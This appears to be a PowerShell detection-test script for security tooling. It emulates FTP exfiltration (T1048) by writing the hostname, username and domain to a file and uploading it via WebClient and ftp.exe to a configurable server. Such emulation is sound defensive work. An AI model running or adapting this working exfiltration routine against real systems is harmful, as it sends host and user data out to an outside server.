<#
.SYNOPSIS
    SafePay FTP Exfiltration - DETECTION TRIGGER  
.DESCRIPTION
    Exfiltrates test data via FTP connection.
    Will trigger EDR detection for T1048.
    TTP: T1048
.PARAMETER FTPServer
    Target FTP server IP address
#>
param(
    [Parameter(Mandatory=$false)]
    [string]$FTPServer = "10.0.0.1"
)

Write-Host "[*] Starting SafePay FTP Exfiltration (T1048)" -ForegroundColor Cyan
Write-Host "[*] Target FTP: $FTPServer" -ForegroundColor Yellow
Write-Host "[*] This will trigger EDR detection for exfiltration" -ForegroundColor Yellow

try {
    # Create test data to exfiltrate
    $testDataPath = "$env:TEMP\rtl_exfil_test.txt"
    $testData = @"
RTL Test Exfiltration Data
========================
Hostname: $env:COMPUTERNAME
Username: $env:USERNAME
Domain: $env:USERDOMAIN
Timestamp: $(Get-Date)
This is test data for EDR detection validation.
"@
    
    $testData | Out-File $testDataPath -Force
    Write-Host "[*] Created test exfil data at: $testDataPath"
    
    # ACTUAL DETECTION TRIGGER - FTP connection attempt
    Write-Host "[*] Attempting FTP connection to $FTPServer..."
    
    # Method 1: FTP via .NET WebClient
    try {
        $ftpUri = "ftp://${FTPServer}/rtl_test_upload.txt"
        $webclient = New-Object System.Net.WebClient
        $webclient.Credentials = New-Object System.Net.NetworkCredential("anonymous", "test@test.com")
        
        Write-Host "[*] Executing: WebClient.UploadFile($ftpUri)"
        $webclient.UploadFile($ftpUri, $testDataPath)
        Write-Host "[+] FTP upload attempted" -ForegroundColor Green
    } catch {
        Write-Host "[-] FTP WebClient failed (expected if no FTP server): $_" -ForegroundColor Yellow
    }
    
    # Method 2: Native ftp.exe command (generates process execution detection)
    Write-Host "[*] Also running: ftp.exe connection attempt"
    
    $ftpScript = @"
open $FTPServer
user anonymous test@test.com
put $testDataPath
quit
"@
    
    $ftpScriptPath = "$env:TEMP\rtl_ftp_script.txt"
    $ftpScript | Out-File $ftpScriptPath -Force
    
    # Run FTP command (this triggers the detection even if it fails)
    Start-Process "ftp.exe" -ArgumentList "-s:$ftpScriptPath" -Wait -NoNewWindow -ErrorAction SilentlyContinue
    
    # Cleanup
    Remove-Item $ftpScriptPath -Force -ErrorAction SilentlyContinue
    Remove-Item $testDataPath -Force -ErrorAction SilentlyContinue
    
    Write-Host "[!] CrowdStrike should detect: 'DataExfiltration' or 'SuspiciousFTPActivity'" -ForegroundColor Magenta
    
} catch {
    Write-Host "[!] Error: $_" -ForegroundColor Red
}

Write-Host "`n[*] Detection should appear in CrowdStrike within 1-2 minutes" -ForegroundColor Cyan
